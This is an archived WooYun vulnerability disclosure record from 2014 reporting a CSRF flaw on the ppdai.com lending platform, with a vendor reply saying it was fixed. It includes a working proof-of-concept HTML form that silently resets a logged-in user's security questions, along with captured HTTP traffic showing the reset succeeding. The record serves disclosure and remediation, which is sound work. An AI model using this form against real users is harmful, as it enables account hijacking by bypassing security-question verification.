{"id": 50791, "wybug_id": "wooyun-2014-076803", "wybug_title": "某互金平台CSRF一枚", "wybug_corp": "上海拍拍贷金融信息服务有限公司", "wybug_author": "lucky_fn", "wybug_date": "2014-09-22 11:35", "wybug_open_date": "2014-09-27 11:36", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-22：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-27：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 设置安全问题画面要先进行安全问题验证才可以重设安全问题。由于存在CSRF，可以绕过安全问题验证，直接重设。 详细说明：  \n\n\n\nCSRF的FORM，登录后直接访问：\n<html>  <body>    <form action=\"http://ac.ppdai.com/userbind/setsafequestion\" method=\"POST\">      <input type=\"hidden\" name=\"QuestionId1\" value=\"1\" />      <input type=\"hidden\" name=\"Answer1\" value=\"a1\" />      <input type=\"hidden\" name=\"QuestionId2\" value=\"2\" />      <input type=\"hidden\" name=\"Answer2\" value=\"a2\" />      <input type=\"hidden\" name=\"QuestionId3\" value=\"3\" />      <input type=\"hidden\" name=\"Answer3\" value=\"a3\" />      <input type=\"submit\" value=\"Submit request\" />    </form>  </body></html>\n修改成功：\n\n   漏洞证明：  使用新登录的安全问题，通过了验证。证明有登录成功。\nPOST /userbind/answersafequestion HTTP/1.1Host: ac.ppdai.comProxy-Connection: keep-aliveContent-Length: 74Accept: */*Origin: http://ac.ppdai.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://ac.ppdai.com/userbind/answersafequestionAccept-Encoding: gzip,deflate,sdchAccept-Language: ja,en-US;q=0.8,en;q=0.6Cookie: ...略...QuestionId1=1&Answer1=a1&QuestionId2=2&Answer2=a2&QuestionId3=3&Answer3=a3HTTP/1.1 200 OKServer: TengineDate: Sat, 20 Sep 2014 01:52:10 GMTContent-Type: application/json; charset=utf-8Content-Length: 132Connection: keep-aliveCache-Control: private, s-maxage=0Via: http/1.1 ppd-107-1-1.0(chSlb){\"Code\":1,\"Message\":\"/userbind/setsafequestion/?type=6888ABACBF1...略...1313DF\",\"Content\":{}}\n   修复方案：  DB登录时加token   版权声明：转载请注明来源 lucky_fn@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-09-27 11:36 厂商回复：  最新状态： 2014-09-27：该漏洞已修复。 2014-09-28：该漏洞当天我们已经修复，由于未及时的查看乌云的状态，导致该漏洞时间过久被忽略掉了，谢谢漏洞作者。  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}